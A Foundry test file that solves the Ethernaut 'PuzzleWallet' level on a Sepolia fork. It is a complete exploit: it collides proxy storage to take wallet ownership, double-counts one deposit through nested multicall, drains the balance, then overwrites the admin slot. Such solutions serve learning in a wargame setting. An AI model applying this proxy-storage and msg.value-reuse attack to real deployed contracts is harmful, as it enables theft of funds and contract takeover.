// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/24-PuzzleWallet/PuzzleWallet.sol";

contract ContractTest is Test {
    PuzzleWallet level24 =
        PuzzleWallet(payable(0x3a85e73b657de0e537c75d18FBF38f3f7CD8f268));
    PuzzleProxy proxy =
        PuzzleProxy(payable(0x3a85e73b657de0e537c75d18FBF38f3f7CD8f268));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));
        vm.label(address(this), "Attacker");
        vm.label(
            address(0x3a85e73b657de0e537c75d18FBF38f3f7CD8f268),
            "Ethernaut24"
        );
    }

    function testEthernaut24() public {
        // making ourselves owner of wallet
        proxy.proposeNewAdmin(address(this)); //replace slot0
        console.log("After pendingAdmin:", proxy.pendingAdmin());
        console.log("After owner:", level24.owner());

        // Make us whitelisted
        level24.addToWhitelist(address(this));

        // multicall
        // 1. deposit
        // 2. multicall (trigger the `bool depositCalled = false;`)
        //    - deposit
        bytes[] memory deposit_first = new bytes[](1);
        deposit_first[0] = abi.encodeWithSelector(level24.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_first[0];
        data[1] = abi.encodeWithSelector(
            level24.multicall.selector,
            deposit_first
        );

        level24.multicall{value: 0.001 ether}(data);

        // run the execute() to send ether to this contract, drain the wallet
        // This will fulfill the setMaxBalance() requirement
        level24.execute(address(this), 0.002 ether, "");
        assert(address(level24).balance == 0);

        // end goal
        level24.setMaxBalance(uint256(uint160(address(this))));

        // check we are admin
        assert(proxy.admin() == address(this));
    }

    receive() external payable {}
}
